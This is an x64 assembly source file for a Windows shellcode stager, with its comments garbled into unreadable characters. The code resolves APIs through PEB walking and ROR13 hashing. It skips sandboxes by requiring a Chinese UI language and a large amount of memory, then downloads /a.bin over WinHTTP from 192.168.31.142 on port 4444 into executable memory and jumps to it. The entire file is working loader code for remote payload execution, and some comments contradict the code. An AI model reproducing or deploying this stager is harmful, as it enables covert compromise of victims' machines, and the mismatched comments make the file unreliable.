.code

main proc

	; ��������־������ջָ�룬ȷ������Windows x64����Լ��
	cld														; ��������־��DF=0�����ַ���������ߵ�ַ����
	and rsp, 0FFFFFFFFFFFFFFF0h								; ��RSP���뵽16�ֽڱ߽磬����ջδ���뵼�µ��쳣

	; 2. ����wininet.dll��
	push 0													; Ϊ�˶���
	mov r14, 'ptthniw'										; �����ַ���'winhttp\0'
	push r14												; ���ַ���ѹջ����ʱRSPָ��"winhttp\0"�ĵ�ַ
	mov rcx, rsp											; RCX = �ַ�����ַ����ΪLoadLibraryA�Ĳ���
	mov r10, 0DEC21CCDh										; kernel32.dll+LoadLibraryA�Ĺ�ϣֵ
	call GetProcAddressByHash

	;GetUserDefaultUILanguage�Ƿ��ص�ǰ�û����û�UI���Ե����Ա�ʶ��
	xor rcx, rcx											;û������ȫ����0
	xor rdx, rdx
	xor r8, r8
	xor r9, r9
	mov r10, 0924E9A49h									
	call GetProcAddressByHash								;����API֮�����ļ��巵�ص�ֵΪ0x804�����ɳ�䶼��Ĭ�����ô�����ģ�����ʹ��Ӣ��ϵͳ��
	cmp eax, 0804h											;�жϷ���ֵ�Ƿ����0x804������0x804��������ڴ��С�жϲ�������֮��������failure�������С�
	jnz failure

	;GlobalMemoryStatusEx�����й�ϵͳ��ǰ�����ڴ�������ڴ�ʹ���������Ϣ��
    sub rsp, 40h											;����ջ�ռ�
    mov dword ptr [rsp], 40h								;dwLength = sizeof(MEMORYSTATUSEX)
    lea rcx, [rsp]											;RCX = &memoryStatus
	xor rdx, rdx
	xor r8, r8
	xor r9, r9
	mov r10, 0681B0A64h										;GlobalMemoryStatusEx
    call GetProcAddressByHash
	test rax, rax											;��鷵��ֵ
    jz  failure												;����ʧ�ܣ����� 0

    mov rax, [rsp+28h]										;RAX = memoryStatus.ullTotalPhys (�������ڴ��ֽ���)
    mov rbx, 32												;�ڴ��С����RBX��8GB
    shl rbx, 30												;ʹ���߼����㣬����һλ���������һ��Сtips���������������㣬��С��һЩ�ֽڡ�
    cmp rax, rbx											;�Ƚ��������ڴ��Ƿ� >= 8GB���Ƚ����֮���־λ�ᱻ����
    setge al												;���ݱ�־λ�����жϣ���� >= 8GB��AL = 1 , ���� AL = 0
    movzx rax, al											;RAX = 0 �� 1 (����ֵ)
    add rsp, 40h											;�ͷ�ջ
	test eax,eax											;rax���е�ֵΪ1��ô�ڴ����8GB����ִ�У�����shellcode����ִ�в���������ִ����һ�д�������failure�������С�
	jz failure

	; 3.WinHttpOpen
	xor rcx,rcx												; pszAgentW
	xor rdx,rdx												; dwAccessType
	xor r8,r8												; pszProxyW
	xor r9,r9												; pszProxyBypassW
	push 1													; dwFlags
	push r9													; ����
	mov r10,332D226Eh										; winhttp.dll+WinHttpOpen hash
	call GetProcAddressByHash

	jmp get_server_host
	; 4.����WinHttpConnect���ӵ�������
winHttpConnect:
	mov rcx,rax												; hSession
	pop rdx													; pswzServerName
	mov r8,4444												; nServerPort
	xor r9,r9												; dwReserved
	mov r10,39AE9EB0h										; winhttp.dll+WinHttpConnect hash
	call GetProcAddressByHash

	; 5.����WinHttpOpenRequest����HTTP������
	call winHttpOpenRequest
server_uri:
	dw '/','a','.','b','i','n',0
winHttpOpenRequest:
	mov rcx,rax												; hConnect
	xor rdx,rdx												; pwszVerb
	pop r8													; pwszObjectName
	xor r9,r9												; pwszVersion
	push r9													; dwFlags
	push r9													; *ppwszAcceptTypes
	push r9													; pwszReferrer
	push r9													; ����
	mov r10,0D3431402h										; winhttp.dll+WinHttpOpenRequest hash
	call GetProcAddressByHash	
	xchg rsi, rax											; ������������RSI����

	; 6.����WinHttpSendRequest����HTTP����
	mov rcx,rsi												; hRequest
	xor rdx,rdx												; lpszHeaders
	xor r8,r8												; dwHeadersLength
	xor r9,r9												; lpOptional
	push r9													; dwContext
	push r9													; dwTotalLength
	push r9													; dwOptionalLength
	push r9													; ����
	mov r10,094B5BFFh										; winhttp.dll+WinHttpSendRequest hash
	call GetProcAddressByHash

	; 7.����WinHttpReceiveResponse�ȴ���������Ӧ
	mov rcx,rsi												; hRequest
	xor rdx,rdx												; lpReserved
	mov r10,0E82D8B6Fh										; winhttp.dll+WinHttpReceiveResponse hash
	call GetProcAddressByHash
	test eax,eax
	jz failure

	; 8.����VirtualAlloc�����ڴ�ռ����ڴ洢Shellcode
	xor rcx, rcx                    						; lpAddress = NULL����ϵͳѡ���ַ��
	mov rdx, 00400000h              						; dwSize = 4MB�������ڴ��С��
	mov r8, 1000h                   						; flAllocationType = MEM_COMMIT���ύ�����ڴ棩
	mov r9, 40h                     						; flProtect = PAGE_EXECUTE_READWRITE���ɶ���д��ִ�У�
	mov r10, 0BCEF49D9h             						; kernel32.dll+VirtualAlloc �Ĺ�ϣֵ
	call GetProcAddressByHash

download_prep:
	xchg rax, rbx                   						; ������ַ����RBX
	push rbx                        						; ����
	push rbx                        						; ռλ�������ڴ洢WinHttpReadData���ص��Ѷ��ֽ�����
	mov rdi, rsp                    						; RDIָ���Ѷ��ֽ���������ջ��ַ��	
download_more:
	mov rcx,rsi												; hRequest
	mov rdx,rbx												; lpBuffer
	mov r8, 8192											; dwNumberOfBytesToRead
	mov r9,rdi												; lpdwNumberOfBytesRead
	mov r10,0F5B42CD6h										; winhttp.dll+WinHttpReadData hash
	call GetProcAddressByHash
	add rsp, 32												; ����Ӱ�ӿռ�

	test eax,eax
	jz failure

	mov ax, word ptr [rdi]									; ��ȡ�Ѷ��ֽ���
	add rbx,rax												; �ƶ�������ָ�뵽��һ��д��λ��
	test eax,eax											;  ����Ƿ��Ѷ�ȡ��ϣ��ֽ���Ϊ0��
	jnz download_more

	pop rax													; clear the temporary storage
	pop rax													; fucking ����

execute_stage:
	ret                             						; ��ת�����ص�Shellcodeִ��

    ; ����
failure:
    mov r10,2E3E5B71h              							; kernel32.dll+ExitProcess ��ϣֵ
    call GetProcAddressByHash 

GetProcAddressByHash:
	
	; 1. ����ǰ4��������ջ�ϣ�������rsi��ֵ
	push r9
	push r8
	push rdx
	push rcx
	push rsi

	; 2. ��ȡ InMemoryOrderModuleList ģ������ĵ�һ��ģ����
	xor rdx,rdx												; ����
	mov rdx,gs:[rdx+60h]									; ͨ��GS�μĴ�����ȡPEB��ַ��TEBƫ��0x60����
	mov rdx,[rdx+18h]										; PEB->Ldr
	mov rdx,[rdx+20h]										; ��һ��ģ��ڵ㣬Ҳ������InMemoryOrderModuleList���׵�ַ

	;3.ģ�����
next_mod:
	mov rsi,[rdx+50h]                 						; ģ������
	movzx rcx,word ptr [rdx+48h]	 						; ģ�����Ƴ���
	xor r8,r8                         						; �洢������Ҫ�����hash

	; 4.����ģ��hash
loop_modname:
	xor rax, rax											; ����EAX��׼�������ַ�
	lodsb													; ��rSI����һ���ֽڵ�AL���Զ�����rSI��
	cmp al,'a'												; �Ƚϵ�ǰ�ַ���ASCIIֵ�Ƿ�С��Сд��ĸ'a'(0x61)
	jl not_lowercase										; ����ַ� < 'a'��˵������Сд��ĸ����ת������
	sub al, 20h												; ���ַ���'a'-'z'��Χ�ڣ�ͨ����0x20ת��Ϊ��д��ĸ��'A'-'Z'��
not_lowercase:
	ror r8d,0dh												; ��R8�ĵ�32λ����ѭ������13λ����Ӱ���32λ
	add r8d,eax												; ����ǰ�ַ���ASCIIֵ���Ѵ�д�����ۼӵ���ϣֵ
	dec ecx													; �ַ�������ECX��1
	jnz loop_modname										; ����ѭ��������һ���ַ���ֱ��ECX����0
	push rdx												; ����ǰģ������ڵ��ַѹջ    
	push r8													; ��������ɵĹ�ϣֵѹջ�洢hashֵ

	; 5.��ȡ������
	mov rdx, [rdx+20h]										; ��ȡģ���ַ
	mov eax, dword ptr [rdx+3ch]							; ��ȡPEͷ��RVA
	add rax, rdx											; PEͷVA
	cmp word ptr [rax+18h],20Bh								; ����Ƿ�ΪPE64�ļ�
	jne get_next_mod1										; ���Ǿ���һ��ģ��
	mov eax, dword ptr [rax+88h]							; ��ȡ�������RVA
	test rax, rax											; ����ģ���Ƿ��е�������
	jz get_next_mod1										; û�о���һ��ģ��
	add rax, rdx											; ��ȡ�������VA
	push rax												; �洢������ĵ�ַ
	mov ecx, dword ptr [rax+18h]							; �����Ƶ����ĺ�������
	mov r9d, dword ptr [rax+20h]							; ���������ַ�����ַ�����RVA
	add r9, rdx												; ���������ַ�����ַ�����VA

	; 6.��ȡ������	
get_next_func:	
	test rcx, rcx											; ��鰴���Ƶ����ĺ��������Ƿ�Ϊ0
	jz get_next_mod											; �����к����Ѵ����꣬��ת����һ��ģ�����
	dec rcx													; �����������ݼ����Ӻ���ǰ�������������飩
	mov esi, dword ptr [r9+rcx*4]							; ��ĩβ��ǰ������һ��������RVAռ4�ֽ�
	add rsi, rdx											; ������RVA
	xor r8, r8												; �洢�������ĺ�������ϣ

	; 7.����ģ�� hash + ���� hash֮��
loop_funcname: 
	xor rax, rax											; ����EAX��׼�������ַ�
	lodsb													; ��rsi����һ���ֽڵ�al��rsi����1
	ror r8d,0dh												; �Ե�ǰ��ϣֵ��r8d��ѭ������13λ
	add r8d,eax												; ����ǰ�ַ���ASCIIֵ��al���ۼӵ���ϣֵ��r8d��
	cmp al, ah												; ��鵱ǰ�ַ��Ƿ�Ϊ0���ַ�����������
	jne loop_funcname										; ���ַ���0������ѭ��������һ���ַ�
	add r8,[rsp+8]											; ��֮ǰѹջ��ģ���ϣֵ��λ��ջ��+8���ӵ���ǰ������ϣ
	cmp r8d,r10d											; r10�洢Ŀ��hash
	jnz get_next_func

	; 8.��ȡĿ�꺯��ָ��
	pop rax													; ��ȡ֮ǰ��ŵĵ�ǰģ��ĵ������ַ
	mov r9d, dword ptr [rax+24h]							; ��ȡ��ű�AddressOfNameOrdinals���� RVA
	add r9, rdx												; ��ű���ʼ��ַ
	mov cx, [r9+2*rcx]										; ����ű��л�ȡĿ�꺯���ĵ�������
	mov r9d, dword ptr [rax+1ch]							; ��ȡ������ַ��AddressOfFunctions���� RVA
	add r9, rdx												; AddressOfFunctions������׵�ַ
	mov eax, dword ptr [r9+4*rcx]							; ��ȡĿ�꺯��ָ���RVA
	add rax, rdx											; ��ȡĿ�꺯��ָ��ĵ�ַ

finish:
	pop r8													; �����ǰģ��hash
	pop r8													; �����ǰ�����λ��
	pop rsi													; �ָ�RSI
	pop rcx													; �ָ���һ������
	pop rdx													; �ָ��ڶ�������
	pop r8													; �ָ�����������
	pop r9													; �ָ����ĸ�����
	pop r10													; �����ص�ַ��ַ�洢��r10��
	sub rsp, 20h											; ��ǰ4������Ԥ�� 4*8=32��20h����Ӱ�ӿռ�
	push r10												; ���ص�ַ
	jmp rax													; ����Ŀ�꺯��

get_next_mod:                 
	pop rax                         						; ����ջ�б���ĵ������ַ
get_next_mod1:
	pop r8                         							; ����֮ǰѹջ�ļ��������ģ���ϣֵ
	pop rdx                         						; ����֮ǰ�洢�ڵ�ǰģ���������е�λ��
	mov rdx, [rdx]                  						; ��ȡ�������һ��ģ��ڵ㣨FLINK��
	jmp next_mod                    						; ��ת��ģ�����ѭ��

get_server_host:
call winHttpConnect

server_host:	
	dw '1','9','2','.','1','6','8','.','3','1','.','1','4','2',0 
main endp
end